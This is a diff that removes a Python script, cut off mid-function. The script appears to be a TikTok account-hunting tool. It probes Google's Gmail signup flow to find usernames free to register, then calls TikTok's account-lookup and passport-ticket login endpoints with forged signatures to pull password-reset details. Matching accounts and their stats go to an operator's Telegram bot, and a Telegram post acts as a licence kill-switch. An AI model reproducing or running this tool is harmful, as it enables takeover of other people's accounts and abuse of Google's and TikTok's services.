@@ -1,705 +1,657 @@
-import sys,os,requests
-while True:
-	try:
-		de = requests.get("https://t.me/communication_Watan/29").text
-		if "NN" not in de:
-			print(" • توقفت الاداة للاشتراك راسلني خاص @Q_e_9 • ")
-			sys.exit()
-			exit()
-			os._exit()
-			raise SystemExit("تم إيقاف البرنامج")
-			quit()
-			exec("exit()")
-		break 
-	except:
-		print("")		
-#— — — — — — — — — — — — —
-import sys, importlib, subprocess
-
-def need(mod, pkg):
-    try:
-        importlib.import_module(mod)
-    except ImportError:
-        subprocess.call([sys.executable, "-m", "pip", "install", "--upgrade", pkg])
-
-need("requests", "requests")
-need("telebot", "pyTelegramBotAPI==3.7.7")
-need("MedoSigner", "MedoSigner")
-need("SignerPy", "SignerPy")
-
-# بعد التأكد:
-import os, sys, time, secrets, threading, string, uuid, random, re, json, binascii
-from random import choice, randrange, randint
-from uuid import uuid4
-from telebot import types
-from urllib.parse import urlencode
-import requests
-import telebot
-try:
-    from MedoSigner import Argus, Gorgon, md5, Ladon
-except ImportError:
-    pass
-try:
-    import SignerPy
-except ImportError:
-    pass
-	
-os.system('clear');import telebot
-Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m'
-idd=input(B+"Enter ID : ")
-tok= input(B+"Enter Token : ")
-
-
-nameee=['5ee5d7b8db9ea6adc488a6d8922f41db',
-'5a7e7c83f61e6e0e1c3ca128cd3ee79a',
-'401c36fc2d0abbdda740a52838cd31c2',
-'a3b91f7d92a916ce843690a99f0c43ee',
-'c46f26a1aa31f443e6b73a2baab4fcb4',
-'a2e045e87922de8c8c5339b04cc23adb',
-'987b534331cb8fe0426158e4f8f39124',
-'9689fb7803f6b4b105e01eda4ab43667',
-'e29d771a2cf7e0185e47a234d57c1808',
-'40210b4815aa47f3d2cfeb45cf713bea',
-'129eef9249b541845eba16fc14781582',
-'6324058bdfe884515217ff4acb90073d',
-'ff3c13526e2a360a1fefaca8c41e9ce3',
-'220a3c08704e2d0a46c9d9b43854e682',
-'1b1d59bf2bbe2458f5b9287c3b41af22',
-'70b4866e3573692bdda7679e8e5d3939',
-'a2e045e87922de8c8c5339b04cc23adb',
-'508ac0dd034d89232616a44f62077380',
-'2aa562d2463d90d723fac8d46b58246c',
-'1b1d59bf2bbe2458f5b9287c3b41af22',
-'90ba1ff26cf1fbca017d44a8be05f41d',
-'e30441f84bebed5ab7fe0c81345b40cc',
-'1c21012aa111369c85ff963c4bc30e29',
-'e9191cf652801115dfd7cc9ce0754492',
-'8b083ff40730e0cd42eb639598906af5',
-'129eef9249b541845eba16fc14781582',
-'f0aa37632755d7e04da7a77f54ea1519',
-'c517f560947625ed86f27435282dd234',
-'61705fae4cd68501d35123df3948656d',
-'98106f1cebb49c19e8e0fa465ea2e979',
-'536ae2abec9ed18942939af83296b8ef',
-'9f0c1ac60c09af5a942bd5df9ae05cdf',
-'a7739802b84434c4175225a907bc4df7',
-'971d7038eb4ee04c7e52209ef7ee5755',
-'2aa562d2463d90d723fac8d46b58246c',
-'48399b568941080f90b6da6cc0f40b63',
-'08af99cac4c0a488bf5500351ad31a50',
-'e29d771a2cf7e0185e47a234d57c1808',
-'48399b568941080f90b6da6cc0f40b63',
-'e365a3aa9f85099e53c0ea46f946a567',
-'508ac0dd034d89232616a44f62077380',
-'14f1735a3ac77dc63e18a59bda77edee',
-'e365a3aa9f85099e53c0ea46f946a567',
-'07535b9405b8573072acc54136195a26',
-'f0aa37632755d7e04da7a77f54ea1519',
-'fcadc9245d341fc099ba5924100019ed',
-'b6d6d6c88a2405fd025cf56ff7124473',
-'6ac7cb6a6cd03bf5e8e9c5dbe2fa7b71',
-'e64ed96b8c3ea51c4524b7dd25bf0abd',
-'9f0c1ac60c09af5a942bd5df9ae05cdf',
-'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
-'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
-'31fffc2561f90d7780c034db4f458dad',
-'e64ed96b8c3ea51c4524b7dd25bf0abd',
-'f2a3ec8f71217f2fa2ed8507a8641920',
-'6fa98a5d216b91fb49e8bd0f50b6dc29',
-'3a19ad6aec83c77bf58ad20a95d87b02',
-'ffea1b72a3de8ebb5c1e48c91d3886cc',
-'c0ed975d7fab0b17ea77c9aac4772eda',
-'62f665d8fef41027c569a264e39d1884',
-'8799b7c86a83c99eb082e963e930b426',
-'30ad5eb572241440c7f642ad07c3972e',
-'3e815d7ed8d5ee5ed26394221cb94814',
-'b521fc106d86884df7392b0d47094b42',
-'70e134536c70bbd31b540bfb9abd9f16',
-'a79666d0aedf81af7dec5e7302ce1a6a',
-'59be59febf4f4e5ad3f01cd51b73c678',
-'b18a44f1169bfdcd307474ceada8090c',
-'46b49a9a910464297d4a2d703cfffb60',
-'9b465c4456506e57cbe2f673fe3d748f',
-'ecb67a58cf2f6a6b7e8341a8f4ec24f8',
-'333c2f1fa9ccc31d05e3433f33379f23',
-'1e5aa603077be314c594aa05c85a29c7',
-'52a1a1b3ad87c9c4b13ee3522aa647f6',
-'226d6f0f02dd07ea3e0e3c7e1a54ee98',
-'f60c544b5014358574cd7df1c1751f42',
-'b054149c7a2fa4681298030e91d0c033',
-'fb32c6bfd5bdef0cd0b9e5c999cf9e46',
-'11fbbcffb0525d52bc394389f24a936b',
-'30514372833cc1b571f8dc8a0f55db94',
-'88c024610ed4bf8ceb37cc92e78b4438',
-'fc1f9672a6d4177993114198414be131',
-'d8f6f9558e1807a1cd083f13de997693',
-'fef15837eef02f1ebd56523240dd5be0',
-'5e4e1267e08331d25ed7012d84f78243',
-'32df03aa0a45104c29c0eb241bfaf052',
-'277641c2bd68423af3c97ee64116c9ea',
-'608e50f670227682805b6c4db9008025',
-'f6c32b0881229967ea0e5c90635fa19e',
-'8f68c10b8a60b64e8d2dd3fcb1cdc6be',
-'497a97f73536f4f24831bebfed672258',
-'6f7a25ed7db6c0620d7d4b1a1779813d',
-'df9f5cef1f2d05757af659235150e5a6',
-'f7e3313f4225c0bdf1ce635e80938a44',
-'ab47913dc08abeb336556e9418449995',
-'c3b41475865dd21e2a42be682cbbeec7',
-'be5d43022279aae0fbb2810645e3a655',
-'e1f1b7e764da963f9d0dfbc2f8c811fb',
-'d0900ba89c1a62c7334db51b90d08046',
-'5eccb0f11bda1f3744d306f7a1c2e4ee',
-'871319a3e34f2034d5204f3e9d3fc9bc',
-'b2874922a4fbc3bcc4863724e612a013',
-'800266a1b9550a662a533bbe0a51edff',
-'ac8cdd63d992feda7eb1be63cd5d3cbe',
-'fe087743cb83b87fe511c4dcc2b54b9e',
-'78cd438e41a1be9f27434a7ecb45d1f6',
-'28797e6bb6e3b4a2924bdd17d5ac2c9d',
-'ecbce30174a3109533e8c9db2b400e9f',
-'de296140fdf052974d313dffaeac39a8',
-'def6f7881ea24c7c6e2f2faafd749e33',
-'5cd2eb39aadf7c11bc741131fefe8352',
-'e2b90094da6ff546902b52c7cbcea7bb',
-'b9d8b79367847fd9dfb8647bb96edd41',
-'38df69157cd19f89825ad86e40533b3e',
-'eb3fa50f60dd60f3a415f4d57d5c368d',
-'8a9e4778c7074dc6497bce8fbc3e7be6',
-'78f01b752b0e291c4177e2319871e5cd',
-'f99638331ea251eba1dfae6ad3e331cd',
-'1d5a8ad70fe1273483834fd99ba1cdee',
-'531e7ed1aa699a929b313b8960677c07',
-'36726a0145f85571c4d7919a564a330d',
-'3e99fe2e40577af27dc4fb15f9b438f7',
-'80b98f6c3b0e9eb1737f0fb96cb73e1d',
-'99b2c615978200c679b321f04d314d49',
-'6452b4925edad1b34284d9cf4887d281',
-'475880946e2be5c2539a6c51746d2a27',
-'12700e53ced122977a6705435f8dc433',
-'99199284fc83817a51844b35e12b9a18',
-'41dede88fec05de213462698b04ce27f',
-'2c973cfb6559bc0369cefdbb75d5cbb7',
-'98b6f608bcb1a1714f7d14ec97397dad',
-'c33e3da3ec3b8e611625db85fb8ea360',
-'dc7d2164919b5432676b4a8315d8f8b3',
-'1edfd0dbb4f14549ead50fb19dc0dae3',
-'771fc5bce51efef06174c5aa78fa896c',
-'f2da58a0f3b534620e8ca7d070be1457',
-'e0a008174fbb2f2c1923e7ca2d7ae0ba',
-'160ca3c436693fcdc1165149c04d26c6',
-'6b73e7069c58abfa77d72af913c75601',
-'fb3ecd7a225441bcdf0f82a153976c51',
-'959c67bd75dce25e3913ddbe7831013c',
-'01d9a4ee761a44ab1f80d4554cc10301',
-'98ac6a1ed1cea0cd7dd86da4ad548983',
-'9e42fb4166611ce207b8bfcf8e76193d',
-'f8448f180e37a6157b2fa6728929c858',
-'300d027cc70fd71efa2dc4e1661bd053',
-'28e5067ca59aefefe8a5716a4c257019',
-'3c639274b33f920b4e2509382a26e737',
-'114f488327fe3f9e0cb7e5d0c93e18da',
-'d176247e0d0e5991755527960c9bac6e',
-'f1b2fee1dd90c445fd9c91de64b3bdbb',
-'d7f340e143dbb4eab73dd8f675d20b97',
-'7013e9767ad43770d1a86cdd45b880e5',
-'e370e7e1b0a0010360282d131c2d0613',
-'63ab5a670d8d6a9fbd14f7d3fd0b30da',
-'bc4d7382e95f3b9fa79d9164dac426e6',
-'9b19bb4e743f4220cc05770ab88164af',
-'f7a3b3d4b075b192cffd1beb30b813c7']
-
-
-
-
-#input(f'{S}Write Name File Session :')
-
-
-
-os.system('clear')
-ya=0
-no=0
-nod=0
-yas=0
-
-kn=requests.get('https://raw.githubusercontent.com/zaid21ru/text/refs/heads/main/test').text
-
-def rest(username):
-	user=str(username)
-	try:
-		def xor(string: str) -> str:
-		    return "".join([hex(ord(_) ^ 5)[2:] for _ in string])     
-		params = {
-		  'request_tag_from': "h5",
-		  'fixed_mix_mode': "1",
-		  'mix_mode': "1",
-		  'account_param': xor(user),
-		  'scene': "4",
-		  'device_platform': "android",
-		  'os': "android",
-		  'app_version': "39.6.3",
-		  'ssmix': "a",
-		  '_rticket': str(time.time()).replace("-","")[:13],
-		  'cdid': str(uuid.uuid4()),
-		  'channel': "googleplay",
-		  'aid': "1233",
-		  'app_name': "musical_ly",
-		  'version_code': "390603",
-		  'version_name': "39.6.3",
-		  'manifest_version_code': "2023906030",
-		  'update_version_code': "2023906030",
-		  'ab_version': "39.6.3",
-		  'resolution': "1080*2220",
-		  'dpi': "440",
-		  'device_type': "Unknown",
-		  'device_brand': "Unknown",
-		  'language': "ar",
-		  'os_api': "30",
-		  'os_version': "11",
-		  'ac': "mobile",
-		  'is_pad': "0",
-		  'current_region': "YE",
-		  'app_type': "normal",
-		  'sys_region': "EG",
-		  'last_install_time': str(int(time.time()) - 4000),
-		  'mcc_mnc': "42103",
-		  'timezone_name': "Asia/Aden",
-		  'residence': "YE",
-		  'app_language': "ar",
-		  'carrier_region': "YE",
-		  'timezone_offset': "10800",
-		  'host_abi': "arm64-v8a",
-		  'locale': "ar",
-		  'ac2': "lte",
-		  'uoo': "0",
-		  'op_region': "YE",
-		  'build_number': "39.6.3",
-		  'region': "EG",
-		  'ts': str(int(time.time())),
-		  'iid': str(random.randint(1, 10**19)),
-		  'device_id': str(random.randint(1, 10**19)),
-		  'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
-		  'support_webview': "1",
-		  'cronet_version': "a482972f_2025-04-03",
-		  'ttnet_version': "4.2.228.11-tiktok",
-		  'use_store_region_cookie': "1"
-		}
-		secret = secrets.token_hex(16)
-		cookies = {
-		    "passport_csrf_token": secret,
-		    "passport_csrf_token_default": secret}
-		headers = {
-		  'User-Agent': "com.zhiliaoapp.musically/2023906030 (Linux; U; Android 11; ar; Unknown; Build/Unknown; Cronet/TTNetVersion:Unknown 2025-04-03 QuicVersion:Unknown 2025-04-03)",
-		  'x-tt-passport-csrf-token': secret,
-		  'Accept': "application/json, text/plain, */*",
-		  'content-type': "application/x-www-form-urlencoded",
-		  
-		}
-		signature = SignerPy.sign(params=params, cookie=cookies)
-		headers.update({
-		    'x-ss-req-ticket': signature['x-ss-req-ticket'],
-		    'x-ss-stub': signature['x-ss-stub'],
-		    'x-argus': signature["x-argus"],
-		    'x-gorgon': signature["x-gorgon"],
-		    'x-khronos': signature["x-khronos"],
-		    'x-ladon': signature["x-ladon"],
-		})
-		
-		response = requests.post("https://api16-normal-c-alisg.ttapis.com/passport/account_lookup/username/", params=params, headers=headers)
-		tok = response.json()["data"]["accounts"][0]["passport_ticket"]
-		params.update({'passport_ticket': tok})
-		signature = SignerPy.sign(params=params, cookie=cookies)
-		headers.update({
-		    'x-ss-req-ticket': signature['x-ss-req-ticket'],
-		    'x-ss-stub': signature['x-ss-stub'],
-		    'x-argus': signature["x-argus"],
-		    'x-gorgon': signature["x-gorgon"],
-		    'x-khronos': signature["x-khronos"],
-		    'x-ladon': signature["x-ladon"],
-		})
-		res = requests.post("https://api16-normal-c-alisg.ttapis.com/passport/user/login_by_passport_ticket/", params=params, headers=headers)	
-		rest = re.search(r'"info":"(.*?)"', str(res.headers)).group(1)
-		return rest
-	except:
-		return "Rest is not available !"
-	
-def info(email):
-    username=email.split("@")[0]
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Accept-Language': 'en-US,en;q=0.9',
-    }    
-    try:
-        url = f"https://www.tiktok.com/@{username}"
-        response = requests.get(url, headers=headers)
-        response.raise_for_status()        
-        html_content = response.text
-        data_pattern = re.compile(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>')
-        match = data_pattern.search(html_content)
-        
-        if not match:
-            ff=f'''
-— — — — — — — — — — — — —
-• Username - {user} 
-• Email - {email} 
-• Def - @Q_e_9 
-— — — — — — — — — — — — —
-    '''
-            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")  
-            return     
-        data = json.loads(match.group(1))
-        
-        iinfo = data['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
-        user = iinfo['user']
-        stats = iinfo['stats']
-        
-        account_data = {
-            'id': user.get('id', 'N/A'),
-            'user': user.get('uniqueId', 'N/A'),
-            'name': user.get('nickname', 'N/A'),
-            'folos': format(stats.get('followerCount', 0), ',d'),
-            'folon': format(stats.get('followingCount', 0), ',d'),
-            'priv': 'نعم' if user.get('privateAccount', False) else 'لا',
-            'lik': format(stats.get('heartCount', 0), ',d'),
-            'vid': format(stats.get('videoCount', 0), ',d'),
-            'verified': 'موثق' if user.get('verified', False) else 'غير موثق'
-        }        
-        ff = f"""
-— — — — — — — — — — — — —
-• Name - {account_data['name']} 
-• Username - @{account_data['user']}
-• Email - {email} 
-• Reset - {rest(username)} 
-— — — — — — — — — — — — —
-• Followers - {account_data['folos']} 
-• Following - {account_data['folon']} 
-• Likes - {account_data['lik']} 
-• Id - {account_data['id']} 
-• Private - {account_data['priv']} 
-• Videos - {account_data['vid']} 
-• Verified - {account_data['verified']} 
-• Def - @Q_e_9 
-— — — — — — — — — — — — —
-        """
-        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")  
-    except requests.exceptions.RequestException as e:
-        with open('working_sessions.txt', 'a') as f:
-        	f.write("\n" + ff)
-    except requests.exceptions.RequestException as e:
-        ff=f'''
-— — — — — — — — — — — — —
-• Username - {user} 
-• Email - {email} 
-• Def - @Q_e_9 
-— — — — — — — — — — — — —
-    '''
-        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")  
-        print(f" خطأ: {str(e)}")
-    except json.JSONDecodeError:
-       ff=f'''
-— — — — — — — — — — — — —
-• Username - {user} 
-• Email - {email} 
-• Def - @Q_e_9 
-— — — — — — — — — — — — —
-    '''
-       requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")   
-       print(f" خطأ: {str(e)}")
-    except Exception as e:
-        ff=f'''
-— — — — — — — — — — — — —
-• Username - {user} 
-• Email - {email} 
-• Def - @Q_e_9 
-— — — — — — — — — — — — —
-    '''
-        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")   
-        print(f" خطأ: {str(e)}")
-def check_gmail(email):
-    global ya,no,yas,nod
-    if '@' in email:email=email.split('@')[0]
-    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
-        return False
-    s = requests.Session()
-    try:
-            headers = {
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'referer': 'https://accounts.google.com/',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'x-browser-channel': 'stable',
-    'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
-    'x-browser-year': '2024',
-}
-            params = {
-    'biz': 'false',
-    'continue': 'https://mail.google.com/mail/u/0/',
-    'ddm': '1',
-    'emr': '1',
-    'flowEntry': 'SignUp',
-    'flowName': 'GlifWebSignIn',
-    'followup': 'https://mail.google.com/mail/u/0/',
-    'osid': '1',
-    'service': 'mail',
-}
-            response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
-            tl=response.url.split('TL=')[1]
-            s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
-            at = response.text.split('"SNlM0e":"')[1].split('"')[0]
-            pass
-    except:''
-    try:
-            name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
-            headers = {
-    'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-    'origin': 'https://accounts.google.com',
-    'referer': 'https://accounts.google.com/',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
-    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
-    'x-same-domain': '1',
-}
-            params = {
-    'rpcids': 'E815hb',
-    'source-path': '/lifecycle/steps/signup/name',
-    'hl': 'en-US',
-    'TL': tl,
-    'rt': 'c',
-}
-            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
-            response = s.post(
-    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-    params=params,
-    headers=headers,
-    data=data,
-).text
-            if 'steps/signup/birthdaygender' in response:
-                pass
-    except:''
-    try:
-            birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
-            headers = {
-    'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-    'origin': 'https://accounts.google.com',
-    'referer': 'https://accounts.google.com/',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
-    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
-    'x-same-domain': '1',
-}
-            params = {
-    'rpcids': 'eOY7Bb',
-    'source-path': '/lifecycle/steps/signup/birthdaygender',
-    'hl': 'en-US',
-    'TL': tl,
-    'rt': 'c',
-}
-            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
-            response = s.post(
-    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-    params=params,
-    headers=headers,
-    data=data,
-).text
-            if 'steps/signup/username' in response:
-                pass
-    except:''
-    try:
-            headers = {
-    'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-    'origin': 'https://accounts.google.com',
-    'referer': 'https://accounts.google.com/',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
-    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
-    'x-same-domain': '1',
-}
-            params = {
-    'rpcids': 'NHJMOd',
-    'source-path': '/lifecycle/steps/signup/username',
-    'hl': 'en-US',
-    'TL': tl,
-    'rt': 'c',
-}
-            data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
-            response = s.post(
-    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-    params=params,
-    headers=headers,
-    data=data,
-).text
-            email=email+'@gmail.com'
-            if 'steps/signup/password' in response:
-            	yas+=1
-            	os.system('clear')
-            	sys.stdout.write(f'''\r
-\033[1;35m - — — — — — — — — — — — — —\033[0m
- < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
- < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
- < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
- < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
- < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
-\033[1;35m - — — — — — — — — — — — — —\033[0m
-''');sys.stdout.flush()
-            	info(email)
-            else:
-            	os.system('clear')
-            	nod+=1
-            	sys.stdout.write(f'''\r
-\033[1;35m - — — — — — — — — — — — — —\033[0m
- < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
- < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
- < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
- < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
- < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
-\033[1;35m - — — — — — — — — — — — — —\033[0m
-''');sys.stdout.flush()
-            print(response)
-    except:print('gg')
-
-
-
-def chzm(email,cookies):
-	global ya,no,yas,nod
-	def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
-	       x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
-	       data=payload
-	       if not unix: unix = int(time.time())
-	       return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}		
-
-
-	params={
-	
-    'aid': '1233',
-   'app_language': 'ar',
